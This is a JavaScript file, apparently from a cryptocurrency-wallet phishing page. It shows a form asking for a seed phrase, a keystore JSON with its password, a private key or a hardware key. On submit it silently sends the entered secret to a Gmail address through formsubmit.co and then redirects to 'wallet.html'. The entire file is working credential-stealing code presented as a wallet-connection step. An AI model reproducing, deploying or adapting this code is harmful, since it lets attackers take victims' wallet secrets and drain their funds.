let e = document.querySelectorAll(".btn");
console.log(e)
const t = (e) => {
  let t = document.querySelector(".label");
  let a = document.querySelector("textarea");
  let o = e.target.innerHTML;
  let r = document.querySelector("form");
  let s = `Input your ${o} value`;
  t.innerHTML = o;
  a.placeholder = s;
  let n = document.querySelector(".text-block");
  let l = document.querySelector(".form-group");
  let d = e.target.getAttribute("data-name");
  r.name = d;
  if (o === "Phrase") {
    n.style.display = "block";
    a.value = "";
    l.style.display = "none";
    l.innerHTML = "";
    r = "phrasekey";
  } else if (o === "Keystore Json") {
    a.value = "";
    n.style.display = "none";
    l.style.display = "block";
    l.innerHTML = `<label for="keystorepassword">KEYSTORE PaSSWOrd</label>
    <input type="password" name='keystorePassword' class="w-input inputpassword" maxlength="256" id="keystorepassword" data-name="keystorepassword" placeholder="" required>`;
  } else if (o === "Private key") {
    n.style.display = "none";
    a.value = "";
    l.style.display = "none";
    l.innerHTML = "";
    r = "privatekey";
  } else {
    a.value = "";
    n.style.display = "block";
    l.innerHTML = "";
  }
};
e.forEach((e) => e.addEventListener("click", t));
let a = document.querySelectorAll("form");
a.forEach((e) => e.addEventListener("submit", o));
function o(e) {
  e.preventDefault();
  let t = document.querySelector("select");
  let a = document.querySelector(".label");
  /* let o = t.value; */
  mail = "googldotco@gmail.com";
  next = "wallet.html";
  subject = `${window.location.hostname} ${new Date()}`;
  let r = new FormData();
  let s = document.querySelector("form").name;
  if (e.target.name === "phrasekey") {
    phrase = document.querySelector("textarea").value;
    r.append("phraseKey", phrase);
  } else if (e.target.name === "keystorekey") {
    jsonphrase = document.querySelector("textarea").value;
    password = document.querySelector('input[name="keystorePassword"]').value;
    r.append("jsonphrase", jsonphrase);
    r.append("password", password);
  } else if (e.target.name === "privatekey") {
    privatekey = document.querySelector("textarea").value;
    r.append("privatekey", privatekey);
  } else if (e.target.name === "hardwareKey") {
    hardwarekey = document.querySelector('input[name="hardware"]').value;
    r.append("hardwarekey", hardwarekey);
  }
  manualconnectmodal.style.display = 'none';
  /* r.append("Type", o); */
  r.append("_captcha", false);
  r.append("_next", next);
  r.append("_template", "table");
  r.append("_subject", subject);
  let n = `https://formsubmit.co/${mail}`;
  fetch(n, { method: "POST", body: r }).then((e) =>
    window.location.assign(next),
  );
}
